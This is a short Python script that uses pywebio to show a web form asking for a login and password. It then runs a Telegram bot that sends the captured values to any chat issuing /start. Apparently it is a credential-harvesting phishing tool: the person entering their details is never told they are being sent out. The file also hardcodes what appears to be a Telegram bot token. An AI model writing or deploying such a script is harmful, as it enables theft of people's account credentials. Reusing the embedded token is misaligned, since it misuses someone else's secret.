import telebot
from pywebio.input import *
from pywebio.output import put_text

login = input("Login")
password = input("Password")

bot = telebot.TeleBot('5650257666:AAHFUxlDBMRSzppDU6t9TK4paQO2hKNo1IE')
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, 'Login: ' + login)
	bot.send_message(message.chat.id, 'Password: ' + password)

bot.polling(none_stop=True)
